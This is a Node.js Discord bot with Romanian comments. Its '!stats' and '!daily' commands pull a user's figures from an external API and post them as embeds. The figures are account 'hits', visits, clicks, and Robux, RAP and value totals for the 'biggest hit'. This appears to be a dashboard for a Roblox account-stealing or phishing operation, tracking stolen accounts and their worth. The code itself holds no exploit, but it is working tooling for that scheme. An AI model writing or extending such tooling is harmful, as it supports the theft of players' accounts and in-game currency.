// 1️⃣ Importuri
const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
require('dotenv').config(); // citire .env

// 2️⃣ Creezi clientul Discord
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

// 3️⃣ Variabile din .env
const TOKEN = process.env.DISCORD_BOT_TOKEN;
const STATUS_CHANNEL_ID = process.env.STATUS_CHANNEL_ID || "1436098432413597726";

// 4️⃣ Funcții utile
function formatNumber(num) { return num?.toLocaleString() || "0"; }

// Retry + timeout pentru API
async function fetchUserStats(userId, retries = 3, timeoutMs = 100000) {
  for (let i = 0; i < retries; i++) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), timeoutMs);

      const res = await fetch(`https://api.injuries.lu/v1/public/user?userId=${userId}`, {
        headers: { "Accept": "application/json" },
        signal: controller.signal
      });

      clearTimeout(timeout);

      if (!res.ok) continue;
      return await res.json();
    } catch (err) {
      console.error(`Attempt ${i + 1} failed:`, err);
    }
  }
  return null;
}

// 5️⃣ Funcție pentru trimis embed
async function sendEmbed(userId, channel, data) {
  if (!data || !data.Normal) return;

  const normal = data.Normal;
  const profile = data.Profile || {};
  const userName = profile.userName || "Unknown";

  const embed = new EmbedBuilder()
    .setColor(0xFFFF00)
    .setThumbnail("https://cdn.discordapp.com/emojis/1437165310775132160.gif")
    .setDescription(`─── <a:emoji_23:1437165438315532431> **USER STATS** ───

<a:emoji_21:1437163698161717468> **User:** **${userName}**

<a:emoji_21:1437163698161717468> **TOTAL STATS:**
Hits: ${formatNumber(normal.Totals?.Accounts)}
Visits: ${formatNumber(normal.Totals?.Visits)}
Clicks: ${formatNumber(normal.Totals?.Clicks)}

<a:emoji_21:1437163698161717468> **BIGGEST HIT:**
Summary: ${formatNumber(normal.Highest?.Summary)}
RAP: ${formatNumber(normal.Highest?.Rap)}
Robux: ${formatNumber(normal.Highest?.Balance)}

<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:**
Summary: ${formatNumber(normal.Totals?.Summary)}
RAP: ${formatNumber(normal.Totals?.Rap)}
Robux: ${formatNumber(normal.Totals?.Balance)}
`)
    .setImage("https://i.imgur.com/rCQ33gA.gif")
    .setFooter({ text: "Stats Bot API Monitor" });

  await channel.send({ embeds: [embed] });
}

// 6️⃣ Event listener pentru mesaje
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const targetUser = message.mentions.users.first() || message.author;
  const targetId = targetUser.id;

  // ===== !stats =====
  if (message.content.startsWith('!stats')) {
    const data = await fetchUserStats(targetId);
    if (!data) return message.reply("❌ Error fetching stats. API slow or unavailable.");
    await sendEmbed(targetId, message.channel, data);
  }

  // ===== !daily =====
  if (message.content.startsWith('!daily')) {
    try {
      const res = await fetch(`https://api.injuries.lu/v2/daily?type=0x2&cs=3&ref=corrupteds&userId=${targetId}`);
      const data = await res.json();
      if (!data || !data.Daily) return message.reply("❌ No daily stats available.");

      const daily = data.Daily || data.Normal;
      const profile = data.Profile || {};
      const userName = profile.userName || targetUser.username;

      const embed = new EmbedBuilder()
        .setColor(0xFFFF00)
        .setThumbnail(targetUser.displayAvatarURL({ dynamic: true, size: 128 }))
        .setDescription(`─── <a:emoji_23:1437165438315532431> **DAILY STATS** ───

<a:emoji_21:1437163698161717468> **User:** **${userName}**

<a:emoji_21:1437163698161717468> **DAILY STATS:**
Hits: ${formatNumber(daily.Totals?.Accounts)}
Visits: ${formatNumber(daily.Totals?.Visits)}
Clicks: ${formatNumber(daily.Totals?.Clicks)}

<a:emoji_21:1437163698161717468> **BIGGEST HIT:**
Summary: ${formatNumber(daily.Highest?.Summary)}
RAP: ${formatNumber(daily.Highest?.Rap)}
Robux: ${formatNumber(daily.Highest?.Balance)}

<a:emoji_21:1437163698161717468> **TOTAL HIT STATS:**
Summary: ${formatNumber(daily.Totals?.Summary)}
RAP: ${formatNumber(daily.Totals?.Rap)}
Robux: ${formatNumber(daily.Totals?.Balance)}
`)
        .setImage("https://i.imgur.com/rCQ33gA.gif")
        .setFooter({ text: "Stats Bot Daily" });

      await message.channel.send({ embeds: [embed] });
    } catch (err) {
      console.error(err);
      message.reply("❌ Error fetching daily stats.");
    }
  }
});

// 7️⃣ Error handler
client.on('error', (error) => console.error('Discord client error:', error));

// 8️⃣ Login bot
if (!TOKEN) { console.error('❌ DISCORD_BOT_TOKEN is not set!'); process.exit(1); }
client.login(TOKEN);
